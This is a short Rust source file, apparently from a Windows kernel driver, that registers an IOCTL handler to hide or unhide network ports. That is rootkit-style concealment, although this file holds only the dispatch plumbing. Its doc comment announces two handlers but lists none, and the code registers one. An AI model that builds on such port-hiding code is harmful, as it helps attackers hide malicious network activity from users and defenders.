use {
    alloc::boxed::Box, 
    hashbrown::HashMap, 
    wdk_sys::{IO_STACK_LOCATION, IRP},
    super::port::add_remove_port_toggle, 
    crate::{utils::ioctls::IoctlHandler, handle}, 
    shared::{ioctls::IOCTL_PORT, structs::PortInfo}, 
};

/// Registers the IOCTL handlers for port-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Parameters
/// 
/// - `ioctls`: A mutable reference to a `HashMap<u32, IoctlHandler>` where the port-related
///   IOCTL handlers will be inserted.
///
pub fn get_port_ioctls(ioctls: &mut HashMap<u32, IoctlHandler>) {
    // Responsible for hide/unhide Port.
    ioctls.insert(IOCTL_PORT, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        let status = unsafe { handle!(stack, add_remove_port_toggle, PortInfo) }; 
        unsafe { (*irp).IoStatus.Information = 0 };
        
        status
    }) as IoctlHandler);
}